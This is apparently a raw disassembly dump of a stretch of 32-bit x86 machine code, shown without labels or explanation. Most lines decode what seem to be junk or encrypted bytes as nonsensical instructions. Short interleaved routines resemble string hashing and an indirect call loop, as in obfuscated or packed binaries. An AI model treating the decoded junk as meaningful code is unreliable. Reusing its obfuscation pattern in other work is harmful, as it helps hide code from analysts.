  4112c3:	xchg   edx,eax
  4112c4:	dec    ebx
  4112c5:	ja     0x41126c
  4112c7:	cdq    
  4112c8:	push   esi
  4112c9:	mov    dl,0x73
  4112cb:	dec    esi
  4112cc:	sub    BYTE PTR [eax-0x75],dh
  4112cf:	in     al,0x4
  4112d1:	dec    esp
  4112d2:	mov    bl,0x6d
  4112d4:	in     eax,0x9a
  4112d6:	push   edi
  4112d7:	arpl   WORD PTR [ecx],cx
  4112d9:	xor    BYTE PTR [ebp*8+0x26955e1c],dl
  4112e0:	xchg   edx,eax
  4112e1:	xchg   edi,eax
  4112e2:	jns    0x41132e
  4112e4:	add    al,0x0
  4112e6:	ret    
  4112e7:	jno    0x4112b6
  4112e9:	pop    ss
  4112ea:	ins    DWORD PTR es:[edi],dx
  4112eb:	nop
  4112ec:	inc    esp
  4112ed:	cld    
  4112ee:	or     bh,ch
  4112f0:	ins    DWORD PTR es:[edi],dx
  4112f1:	pop    ecx
  4112f2:	fisttp QWORD PTR [edx-0x11]
  4112f5:	sub    DWORD PTR [eax],edi
  4112f7:	add    DWORD PTR [edi+0x5f7913ca],0x860d9734
  411301:	xlat   BYTE PTR ds:[ebx]
  411302:	inc    ebp
  411303:	cmp    DWORD PTR [ecx+0x69],ecx
  411306:	lahf   
  411307:	push   ecx
  411308:	(bad)  
  411309:	aad    0x49
  41130b:	mov    eax,0x96677b70
  411310:	pushf  
  411311:	in     al,0x7d
  411313:	push   ebp
  411314:	test   al,0x1f
  411316:	shr    bh,1
  411318:	loop   0x4112c3
  41131a:	pop    edx
  41131b:	popf   
  41131c:	add    cl,bh
  41131e:	jne    0x4112aa
  411320:	les    edi,FWORD PTR [edx]
  411322:	shr    BYTE PTR [edx-0x1c692140],1
  411328:	popa   
  411329:	cmp    DWORD PTR [ebx],ebx
  41132b:	jno    0x411392
  41132d:	clc    
  41132e:	inc    ebx
  41132f:	arpl   WORD PTR [esi+ecx*4],bp
  411332:	mov    ecx,0xac1c9066
  411337:	pop    ebx
  411338:	and    al,0x23
  41133a:	and    BYTE PTR [edi],0x17
  41133d:	sub    ebx,ecx
  41133f:	push   esi
  411340:	cmp    BYTE PTR [esi+edx*2+0x14137541],cl
  411347:	gs push ebx
  411349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41134a:	sub    esi,DWORD PTR gs:[ecx]
  41134d:	lds    ebx,FWORD PTR [esi+0x39]
  411350:	xor    DWORD PTR [edi-0x3f],edi
  411353:	cmp    eax,0xfed0a5e1
  411358:	mov    ebp,0x5a5f5134
  41135d:	cmp    BYTE PTR [edx+0x3b],0xdb
  411361:	xor    ebx,DWORD PTR [ebx+0x60]
  411364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411365:	test   al,0xed
  411367:	in     eax,dx
  411368:	out    dx,al
  411369:	imul   edi,DWORD PTR [eax+0x52],0x709cde08
  411370:	adc    eax,0x7f4d4310
  411375:	aam    0x7b
  411377:	adc    BYTE PTR [esi+0x8],dh
  41137a:	dec    BYTE PTR [edx-0x7457fabc]
  411380:	push   ebp
  411381:	or     al,0x3a
  411383:	add    cl,BYTE PTR [edi]
  411385:	test   DWORD PTR [ecx-0x74fffffd],ecx
  41138b:	inc    ebp
  41138c:	clc    
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx+0x395cea1],ecx
  4113db:	test   eax,0x7e7e4001
  4113e0:	icebp  
  4113e1:	jg     0x411461
  4113e3:	jle    0x411415
  4113e5:	inc    ebx
  4113e6:	and    DWORD PTR [edi+0x49],0xffffff9b
  4113ea:	adc    BYTE PTR [ebp+esi*8+0x4d633009],bh
  4113f1:	pop    ebp
  4113f2:	mov    dl,0x99
  4113f4:	pop    edi
  4113f5:	push   cs
  4113f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113f7:	dec    ebx
  4113f8:	mov    cl,0xdf
  4113fa:	lock push ebp
  4113fc:	rol    DWORD PTR [ebp+0x71],1
  4113ff:	sub    DWORD PTR [ecx-0x41],eax
  411402:	mov    esi,0xd948f7cb
  411407:	cmp    BYTE PTR [edi+0x4a],cl
  41140a:	mov    al,ds:0x5fbb0342
  41140f:	int3   
  411410:	sub    DWORD PTR [ecx+0x1c],esp
  411413:	jbe    0x4113b4
  411415:	daa    
  411416:	in     al,0x5
  411418:	cwde   
  411419:	and    BYTE PTR [edi],dl
  41141b:	fdivr  DWORD PTR [ebp-0x173923d4]
  411421:	cdq    
  411422:	stos   DWORD PTR es:[edi],eax
  411423:	bswap  esi
  411425:	in     eax,dx
  411426:	pop    ds
  411427:	sti    
  411428:	adc    al,0xaa
  41142a:	add    dl,BYTE PTR [eax+eax*2+0xead5743]
  411431:	sub    al,0x9a
  411433:	sub    eax,0x4c5e907
  411438:	cs push eax
  41143a:	add    cl,cl
  41143c:	xor    DWORD PTR [ebp+esi*1-0x2caa9669],eax
  411443:	imul   DWORD PTR [edx+0x6f]
  411446:	clc    
  411447:	stos   DWORD PTR es:[edi],eax
  411448:	repnz push 0xfffffff9
  41144b:	sbb    al,0x47
  41144d:	call   0x9de7:0x38db6a68
  411454:	jle    0x41142f
  411456:	jns    0x411401
  411458:	push   cs
  411459:	hlt    
  41145a:	dec    edi
  41145b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41145c:	out    dx,al
  41145d:	xchg   edx,eax
  41145e:	(bad)  
  41145f:	lods   eax,DWORD PTR ds:[esi]
  411460:	sbb    BYTE PTR [esp+eiz*4+0x57741160],al
  411467:	jnp    0x41145d
  411469:	call   0x9d3a91bb
  41146e:	or     BYTE PTR [eax-0x419d2d43],bh
  411474:	cmp    al,0x77
  411476:	out    dx,eax
  411477:	test   al,0x1e
  411479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41147a:	xchg   ebx,eax
  41147b:	in     eax,0xe3
  41147d:	mov    dl,0xeb
  41147f:	xchg   esp,eax
  411480:	shl    BYTE PTR [ebx-0x5a],cl
  411483:	inc    eax
  411484:	or     al,0xaa
  411486:	jnp    0x4114ec
  411488:	pop    ebx
  411489:	adc    esp,edx
  41148b:	mov    esp,fs
  41148d:	adc    al,0x97
  41148f:	sbb    bh,BYTE PTR [ebx+0x56]
  411492:	pop    es
  411493:	add    eax,0xe4f0570d
  411498:	jg     0x4114e9
  41149a:	mov    ebp,0x7ffdf8ec
  41149f:	mov    ebx,0xe21af4a2
  4114a4:	adc    ah,ch
  4114a6:	push   eax
  4114a7:	hlt    
  4114a8:	nop
  4114a9:	inc    edi
  4114aa:	scas   eax,DWORD PTR es:[edi]
  4114ab:	cmp    DWORD PTR [esi],edi
  4114ad:	adc    ecx,0xffffffa6
  4114b0:	sbb    esp,DWORD PTR [ebp-0x162aa194]
  4114b6:	fstp   DWORD PTR [edx+0x10]
  4114b9:	pop    ds
  4114ba:	fild   QWORD PTR [ebp+0x4e79de]
  4114c0:	add    eax,0x44fc82b6
  4114c5:	jl     0x411538
  4114c7:	aaa    
  4114c8:	or     al,0xf0
  4114ca:	loop   0x41147f
  4114cc:	pop    ebx
  4114cd:	xchg   ecx,eax
  4114ce:	pop    ebp
  4114cf:	mov    ds:0x5bdf2e8d,eax
  4114d4:	inc    eax
  4114d5:	daa    
  4114d6:	sub    al,0xeb
  4114d8:	or     bl,BYTE PTR [esi]
  4114da:	inc    esp
  4114db:	icebp  
  4114dc:	pop    esp
  4114dd:	adc    eax,0x6b1d706b
  4114e2:	lods   eax,DWORD PTR ds:[esi]
  4114e3:	adc    BYTE PTR [eax+ebp*1],dl
  4114e6:	add    al,0x40
  4114e8:	and    al,0x39
  4114ea:	fadd   st(6),st
  4114ec:	addr16 call 0x2457:0xf2eac9b1
  4114f4:	loope  0x411539
  4114f6:	in     al,0xca
  4114f8:	test   BYTE PTR [edx+edx*1+0x37],ah
  4114fc:	fwait
  4114fd:	lods   al,BYTE PTR ds:[esi]
  4114fe:	jmp    0x55a3778b
  411503:	xchg   edx,eax
  411504:	mov    eax,0x67253e5b
  411509:	fisttp DWORD PTR [esi+0x4fb5dfda]
  41150f:	pop    esp
  411510:	lods   eax,DWORD PTR ds:[esi]
  411511:	std    
  411512:	outs   dx,BYTE PTR ds:[esi]
  411513:	fmul   QWORD PTR [esi]
  411515:	pop    edx
  411516:	adc    al,0xdf
  411518:	inc    esp
  411519:	fcmove st,st(6)
  41151b:	rol    esp,cl
  41151d:	popa   
  41151e:	hlt    
  41151f:	cdq    
  411520:	inc    esp
  411521:	mul    DWORD PTR [edi]
  411523:	adc    dl,BYTE PTR [ebx-0x7b]
  411526:	xchg   ebp,eax
  411527:	push   es
  411528:	clc    
  411529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41152a:	icebp  
  41152b:	mov    bh,0x95
  41152d:	fimul  WORD PTR [ebx]
  41152f:	call   0x48022056
  411534:	or     bl,al
  411536:	inc    eax
  411537:	cmp    BYTE PTR ds:0xb3805e53,bl
  41153d:	jmp    0x41151a
  41153f:	jno    0x4115a4
  411541:	(bad)
  411544:	stc    
  411545:	pop    edx
  411546:	(bad)  
  411547:	js     0x4115ab
  411549:	cli    
  41154a:	inc    esp
  41154b:	cli    
  41154c:	fcom   DWORD PTR [ecx]
  41154e:	stc    
  41154f:	popf   
  411550:	push   es
  411551:	imul   ecx,DWORD PTR [esi],0xe94ecf9e
  411557:	push   cs
  411558:	test   eax,0xc44072e6
  41155d:	mov    BYTE PTR [edx-0x72221bec],dh
  411563:	inc    DWORD PTR [ebp+0xc]
  411566:	jmp    0x4111ca
  41156b:	mov    eax,DWORD PTR [ebp-0x10]
  41156e:	xor    eax,ecx
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	xchg   BYTE PTR [edx+0x4180b013],dl
  411587:	jle    0x411607
  411589:	icebp  
  41158a:	jg     0x41160a
  41158c:	jle    0x411602
  41158e:	xchg   BYTE PTR [esi-0x22d3e98a],bh
  411594:	leave  
  411595:	repnz or DWORD PTR [ebp-0x700d5fcb],ecx
  41159c:	pushf  
  41159d:	add    DWORD PTR [edx+0x9],0x4b970012
  4115a4:	jo     0x411609
  4115a6:	mov    edi,0x47bcd430
  4115ab:	out    0x61,al
  4115ad:	add    ebp,DWORD PTR [eax-0x18]
  4115b0:	xor    bl,ch
  4115b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115b3:	push   ds
  4115b4:	mov    DWORD PTR [esi-0x31da4944],esp
  4115ba:	sbb    edi,ebx
  4115bc:	sub    eax,0x116d56e6
  4115c1:	mov    bh,0xc9
  4115c3:	xchg   DWORD PTR [ebp+0x2c455193],esi
  4115c9:	pop    edi
  4115ca:	adc    al,0x65
  4115cc:	fild   WORD PTR [ecx+eax*1+0x44]
  4115d0:	mov    BYTE PTR [eax-0x1b],cl
  4115d3:	xchg   BYTE PTR [eax+0x5f],dh
  4115d6:	mov    ch,0xad
  4115d8:	pop    esp
  4115d9:	add    edx,DWORD PTR [eax]
  4115db:	and    al,0xf3
  4115dd:	and    eax,0x11177802
  4115e2:	cs xchg edx,eax
  4115e4:	stc    
  4115e5:	push   ss
  4115e6:	(bad)  
  4115e7:	adc    eax,0x52ecffd1
  4115ec:	jbe    0x4115d7
  4115ee:	mov    ebx,edi
  4115f0:	push   edi
  4115f1:	and    esp,DWORD PTR [ebx]
  4115f3:	mov    eax,0xc3660ba1
  4115f8:	sar    si,cl
  4115fb:	add    al,0xa1
  4115fd:	int3   
  4115fe:	jg     0x411606
  411600:	dec    ebx
  411601:	mov    ch,0xb8
  411603:	lock and al,0xf6
  411606:	test   eax,0x1b92c800
  41160b:	ds push esp
  41160d:	sub    DWORD PTR [eax+0x4c],ebx
  411610:	mov    esp,0xf8bf50d9
  411615:	div    DWORD PTR [edx]
  411617:	pusha  
  411618:	(bad)  
  411619:	and    cl,ah
  41161b:	cdq    
  41161c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41161d:	sti    
  41161e:	fidiv  DWORD PTR [edx]
  411620:	or     esp,edi
  411622:	adc    al,BYTE PTR [edx-0xb]
  411625:	jge    0x41167b
  411627:	imul   ebx,eax,0xffffffdc
  41162a:	ror    BYTE PTR [eax+ebp*2-0x2dcc4575],cl
  411631:	int    0x4c
  411633:	sub    DWORD PTR cs:[eax+ecx*8],0x5e
  411638:	sub    ecx,DWORD PTR [esp+eax*8-0x15]
  41163c:	test   ah,bh
  41163e:	adc    eax,0x4bb76ac6
  411643:	and    ecx,DWORD PTR ds:0x51e9bc00
  411649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41164a:	fs popf 
  41164c:	loope  0x4116ad
  41164e:	(bad)  
  41164f:	call   DWORD PTR [ebp+0x5f]
  411652:	sbb    ch,dl
  411654:	mov    dh,0x52
  411656:	lods   al,BYTE PTR ds:[esi]
  411657:	pop    ecx
  411658:	and    BYTE PTR cs:[ebp-0x2f],dh
  41165c:	push   eax
  41165d:	(bad)  
  41165e:	xchg   esp,eax
  41165f:	sti    
  411660:	(bad)  
  411661:	adc    al,0xbd
  411663:	icebp  
  411664:	xchg   DWORD PTR [edx+0x1d],edi
  411667:	lods   al,BYTE PTR ds:[esi]
  411668:	xchg   DWORD PTR [eax],eax
  41166a:	and    eax,0x1a9cdd40
  41166f:	cs or  dl,bh
  411672:	js     0x41160d
  411674:	pusha  
  411675:	cmp    al,0x3
  411677:	cmp    edi,ebx
  411679:	or     DWORD PTR [eax-0x5c29eb39],ebp
  41167f:	mov    edx,DWORD PTR [edi-0x2f833f3e]
  411685:	pop    eax
  411686:	mov    ds:0x5ab181be,eax
  41168b:	leave  
  41168c:	mov    ecx,0x75ecbd14
  411691:	inc    esp
  411692:	mov    DWORD PTR ds:0x7948a8f5,esp
  411698:	sub    eax,0x9939eb4e
  41169d:	(bad)  
  41169e:	jno    0x411666
  4116a0:	stos   BYTE PTR es:[edi],al
  4116a1:	and    eax,ebp
  4116a3:	add    ch,BYTE PTR [ecx]
  4116a5:	in     eax,0x5b
  4116a7:	xchg   ebx,eax
  4116a8:	or     dh,ah
  4116aa:	outs   dx,DWORD PTR ds:[esi]
  4116ab:	cwde   
  4116ac:	bound  esp,QWORD PTR [eax]
  4116ae:	dec    ebp
  4116af:	jle    0x4116ae
  4116b1:	jo     0x41165d
  4116b3:	mov    eax,0x39a2c3f6
  4116b8:	mov    esp,0x8035db10
  4116bd:	mov    dh,0x55
  4116bf:	mov    ebp,0xaedbfbc3
  4116c4:	cwde   
  4116c5:	test   DWORD PTR ds:0x60ceaeac,esi
  4116cb:	pop    eax
  4116cc:	mov    edx,0x6982bcb0
  4116d1:	nop
  4116d2:	(bad)  
  4116d4:	in     al,dx
  4116d5:	gs retf 0x167f
  4116d9:	mov    al,ch
  4116db:	push   edx
  4116dc:	in     eax,0x28
  4116de:	jp     0x41172b
  4116e0:	dec    eax
  4116e1:	inc    edx
  4116e2:	jae    0x41166b
  4116e4:	scas   al,BYTE PTR es:[edi]
  4116e5:	es inc ebx
  4116e7:	pop    DWORD PTR [eax-0x5a]
  4116ea:	xchg   ebp,eax
  4116eb:	mov    al,0x5a
  4116ed:	xor    ah,dh
  4116ef:	jmp    0x8b76:0xfeed250b
  4116f6:	pop    ss
  4116f7:	(bad)  
  4116f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116fa:	pop    ds
  4116fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116fc:	push   esp
  4116fd:	mov    bl,0xae
  4116ff:	ss or  al,0xf9
  411702:	out    0x51,eax
  411704:	retf   0xe14e
  411707:	in     eax,dx
  411708:	stos   DWORD PTR es:[edi],eax
  411709:	test   eax,0x4d8b674c
  41170e:	adc    BYTE PTR [ebx],al
  411710:	(bad)  
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4336ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4336fb,0x4336c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433703,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43372b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4336bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0x21c46d87
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x411791
  41178e:	and    BYTE PTR [ebp+edi*8+0x34],bh
  411792:	enter  0x7c0f,0x6d
  411796:	cmp    bh,BYTE PTR [esi+0x6b]
  411799:	mov    al,0x5b
  41179b:	mov    al,0xad
  41179d:	push   eax
  41179e:	dec    esi
  41179f:	xor    BYTE PTR [edx],dh
  4117a1:	jns    0x4117f8
  4117a3:	icebp  
  4117a4:	ret    0x912c
  4117a7:	mov    DWORD PTR [esi-0x22],ebx
  4117aa:	xor    bl,dl
  4117ac:	sbb    al,0xe3
  4117ae:	clc    
  4117af:	mov    dh,0x4
  4117b1:	adc    al,0x9b
  4117b3:	lock cmp al,0x88
  4117b6:	outs   dx,DWORD PTR ds:[esi]
  4117b7:	pop    ebx
  4117b8:	xor    BYTE PTR [eax-0x6d7133a3],al
  4117be:	pop    edx
  4117bf:	push   edx
  4117c0:	loope  0x4117c7
  4117c2:	xchg   ecx,eax
  4117c3:	mov    eax,ds:0x9e2966b7
  4117c8:	repz mov ch,0x95
  4117cb:	(bad)  
  4117cc:	out    dx,eax
  4117cd:	mov    ecx,0x889ac68b
  4117d2:	push   ebp
  4117d3:	jns    0x41178c
  4117d5:	scas   eax,DWORD PTR es:[edi]
  4117d6:	sbb    eax,DWORD PTR [esi-0x52]
  4117d9:	xor    DWORD PTR [ecx+edi*2-0x3a9524fe],0xb41aefff
  4117e4:	xchg   edx,eax
  4117e5:	stc    
  4117e6:	mov    eax,ds:0xac9c6501
  4117eb:	psrad  mm1,QWORD PTR [ebp*8-0x3a66b90]
  4117f3:	jmp    0xb76c:0xdc6a9075
  4117fa:	add    DWORD PTR [edi],0xa0677d7f
  411800:	jno    0x411798
  411802:	scas   al,BYTE PTR es:[edi]
  411803:	stos   BYTE PTR es:[edi],al
  411804:	sbb    DWORD PTR [eax+0x23826de5],edi
  41180a:	neg    BYTE PTR [eax-0xfc446b1]
  411810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411811:	xchg   ebp,eax
  411812:	xor    ch,BYTE PTR [edx+esi*1]
  411815:	push   eax
  411816:	xchg   DWORD PTR [eax-0x64d849a0],eax
  41181c:	add    ebp,edx
  41181e:	adc    esp,DWORD PTR [edx-0x70]
  411821:	dec    ebp
  411822:	call   0xc5a7:0x5cf4d121
  411829:	data16 hlt 
  41182b:	into   
  41182c:	es in  eax,0xe4
  41182f:	xor    DWORD PTR [esi-0x5a0c6f39],ebp
  411835:	ss daa 
  411837:	mov    edx,0xf4a5fc30
  41183c:	sbb    esi,eax
  41183e:	mov    bh,0xef
  411840:	cmp    eax,0x9b66756a
  411845:	sub    ah,BYTE PTR [ebx-0x54]
  411848:	push   esi
  411849:	jne    0x41181c
  41184b:	pop    ebx
  41184c:	jb     0x4117d8
  41184e:	inc    edi
  41184f:	lock push ds
  411851:	bt     DWORD PTR [ebx],edi
  411854:	test   eax,0xf5950280
  411859:	cwde   
  41185a:	test   BYTE PTR [esi+ecx*2-0x379436fd],ch
  411861:	jmp    0x4118a8
  411863:	aad    0x67
  411865:	sub    bh,dl
  411867:	mov    ds:0x2a18fa25,al
  41186c:	mov    al,ds:0xa5ee4c1
  411871:	pop    ds
  411872:	xchg   ecx,eax
  411873:	mov    cl,0x23
  411875:	nop
  411876:	es das 
  411878:	bound  ebp,QWORD PTR [edi]
  41187a:	push   0x37
  41187c:	pop    ds
  41187d:	inc    esi
  41187e:	sub    al,0x15
  411880:	mov    eax,ds:0xd57efbf1
  411885:	inc    edx
  411886:	mov    ?,WORD PTR [ebp+0x797d7842]
  41188c:	(bad)  
  41188d:	sbb    al,0x61
  41188f:	fs inc ebp
  411891:	shr    BYTE PTR [esi],cl
  411893:	push   es
  411894:	inc    ebx
  411895:	sub    eax,0x8eb13237
  41189a:	nop
  41189b:	(bad)  
  41189c:	xor    DWORD PTR [ebp-0x39],ecx
  41189f:	xchg   esi,eax
  4118a0:	pop    esi
  4118a1:	cmp    al,0xe2
  4118a3:	mov    ds:0x828ad282,eax
  4118a8:	sbb    BYTE PTR [edx-0x7b],dl
  4118ab:	scas   eax,DWORD PTR es:[edi]
  4118ac:	out    dx,eax
  4118ad:	icebp  
  4118ae:	(bad)  
  4118af:	aas    
  4118b0:	into   
  4118b1:	ret    0x3ec0
  4118b4:	pop    ebx
  4118b5:	dec    ebx
  4118b6:	adc    DWORD PTR [esp+eax*8+0x33ad6e6a],eax
  4118bd:	xchg   edx,esi
  4118bf:	(bad)
  4118c2:	mov    BYTE PTR [edx],cl
  4118c4:	popa   
  4118c5:	pop    es
  4118c6:	jno    0x411877
  4118c8:	jle    0x4118fc
  4118ca:	sub    ah,al
  4118cc:	cmp    eax,0x4427f7eb
  4118d1:	pop    edi
  4118d2:	ins    DWORD PTR es:[edi],dx
  4118d3:	ja     0x4118f9
  4118d5:	jne    0x411879
  4118d7:	jg     0x41185e
  4118d9:	mov    BYTE PTR [eax],bh
  4118db:	in     al,0xdb
  4118dd:	imul   ebp,DWORD PTR [eax-0x14],0x562b8a65
  4118e4:	in     al,0xd
  4118e6:	rol    DWORD PTR [edi+edi*8-0x7e44d7af],0x76
  4118ee:	lea    ecx,[eax+0x1cb2fda9]
  4118f4:	dec    eax
  4118f5:	xor    eax,0x9c14d7e6
  4118fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118fb:	mov    ecx,0x7294b156
  411900:	jo     0x41189d
  411902:	pop    esi
  411903:	and    DWORD PTR [edx],edx
  411905:	mov    ds:0xc2752be,al
  41190a:	ins    BYTE PTR es:[edi],dx
  41190b:	mov    edx,0xcfb4f525
  411910:	mov    ch,0x20
  411912:	les    ecx,FWORD PTR [edx+0x1b]
  411915:	jg     0x411933
  411917:	and    DWORD PTR [edi],ecx
  411919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41191a:	or     dl,BYTE PTR ds:0x64e0d43b
  411920:	jge    0x41192f
  411922:	adc    eax,0x393c8967
  411927:	cdq    
  411928:	ins    BYTE PTR es:[edi],dx
  411929:	call   0xd8cc:0x1e6a5440
  411930:	mov    ah,0x8a
  411932:	xchg   ebp,eax
  411933:	scas   eax,DWORD PTR es:[edi]
  411934:	enter  0xab06,0x6c
  411938:	push   es
  411939:	mov    esi,0xfb89c1f0
  41193e:	xchg   esi,eax
  41193f:	lock and BYTE PTR [ebx+0xf],cl
  411943:	and    eax,ecx
  411945:	xchg   ecx,eax
  411946:	inc    ebp
  411947:	(bad)  [esi-0x27]
  41194a:	ss pop ds
  41194c:	cmp    BYTE PTR [bx+si],cl
  41194f:	aad    0x70
  411951:	xlat   BYTE PTR ds:[ebx]
  411952:	sahf   
  411953:	fisubr DWORD PTR [esi-0x66]
  411956:	mov    bh,0x81
  411958:	cmp    al,0x58
  41195a:	cs sub cl,0x2a
  41195e:	xchg   ebx,eax
  41195f:	sbb    dl,BYTE PTR ds:0x70fae577
  411965:	fbstp  TBYTE PTR [ecx]
  411967:	test   eax,0x2af89410
  41196c:	push   0xd6510ba7
  411971:	je     0x411996
  411973:	sar    dh,0x47
  411976:	scas   eax,DWORD PTR es:[edi]
  411977:	fwait
  411978:	jmp    0xdcf999f3
  41197d:	and    DWORD PTR [esi],edx
  41197f:	mov    eax,0x156e4483
  411984:	sbb    eax,ecx
  411986:	dec    esp
  411987:	inc    esi
  411988:	push   cs
  411989:	inc    esi
  41198a:	push   0xffffffba
  41198c:	das    
  41198d:	les    ebx,FWORD PTR [ecx]
  41198f:	ficom  WORD PTR [ebp-0x63]
  411992:	pop    ds
  411993:	(bad)  
  411994:	jle    0x411a05
  411996:	or     eax,0x1ecefc08
  41199b:	ss sub esi,esi
  41199e:	jae    0x41196b
  4119a0:	loopne 0x4119b6
  4119a2:	jg     0x411a10
  4119a4:	cmc    
  4119a5:	pusha  
  4119a6:	xchg   ebp,eax
  4119a7:	mov    ds:0x343020f,eax
  4119ac:	dec    eax
  4119ad:	cmp    al,0x9
  4119af:	sbb    eax,0x433623
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433727,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433727
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433727,eax
  4119d6:	cmp    DWORD PTR ds:0x433727,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433727,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0x55
  411a13:	fsubr  QWORD PTR [ecx+0x4a]
  411a16:	and    eax,0x107e7e4d
  411a1b:	jl     0x411a9b
  411a1d:	jle    0x411a02
  411a1f:	into   
  411a20:	retf   
  411a21:	dec    esp
  411a22:	gs and al,0x8f
  411a25:	inc    eax
  411a26:	ins    BYTE PTR es:[edi],dx
  411a27:	mov    eax,0x3e9fe846
  411a2c:	or     DWORD PTR [edx*8+0x1e6d0a81],ebx
  411a33:	(bad)  
  411a34:	cmp    cl,bl
  411a36:	xchg   esi,eax
  411a37:	stos   BYTE PTR es:[edi],al
  411a38:	xchg   esi,eax
  411a39:	lods   al,BYTE PTR ds:[esi]
  411a3a:	mul    ah
  411a3c:	std    
  411a3d:	inc    edi
  411a3e:	mov    eax,ds:0x14ec33bb
  411a43:	or     esp,edi
  411a45:	pop    eax
  411a46:	mov    ebp,0x4d13dd3b
  411a4b:	mov    ebp,0x463cc512
  411a50:	mov    eax,0xa93f14e3
  411a55:	adc    DWORD PTR [ecx-0x64],esi
  411a58:	or     dl,BYTE PTR [eax-0x71aafa2e]
  411a5e:	push   cs
  411a5f:	cdq    
  411a60:	cmp    eax,0x7e97a574
  411a65:	push   edx
  411a66:	xchg   esi,eax
  411a67:	outs   dx,BYTE PTR es:[esi]
  411a69:	out    0x8e,al
  411a6b:	outs   dx,DWORD PTR ds:[esi]
  411a6c:	lahf   
  411a6d:	sbb    al,0xb5
  411a6f:	mov    edx,0xc402056e
  411a74:	jg     0x411a88
  411a76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a77:	stos   BYTE PTR es:[edi],al
  411a78:	test   al,0xa3
  411a7a:	test   eax,0xbd6ab46a
  411a7f:	inc    esi
  411a80:	outs   dx,BYTE PTR ds:[esi]
  411a81:	mov    bh,0xb3
  411a83:	pop    ss
  411a84:	pusha  
  411a85:	sbb    al,0x6e
  411a87:	mov    ecx,0xda581c22
  411a8c:	(bad)  
  411a8d:	or     BYTE PTR [ebp+0x57b028f5],ah
  411a93:	(bad)  
  411a94:	xchg   esi,eax
  411a95:	or     al,0xf9
  411a97:	xor    ebp,edx
  411a99:	retf   0x9264
  411a9c:	js     0x411a54
  411a9e:	daa    
  411a9f:	add    al,0xf9
  411aa1:	stc    
  411aa2:	stc    
  411aa3:	lods   al,BYTE PTR ds:[esi]
  411aa4:	ficom  DWORD PTR [edx+ebx*1-0x2e]
  411aa8:	lock ins DWORD PTR es:[edi],dx
  411aaa:	cmp    DWORD PTR [esi-0x7504ccd],esp
  411ab0:	adc    DWORD PTR [esi-0x2f],esp
  411ab3:	scas   al,BYTE PTR es:[edi]
  411ab4:	ret    0x18a8
  411ab7:	push   ss
  411ab8:	fdiv   DWORD PTR [edx+0xc]
  411abb:	stos   BYTE PTR es:[edi],al
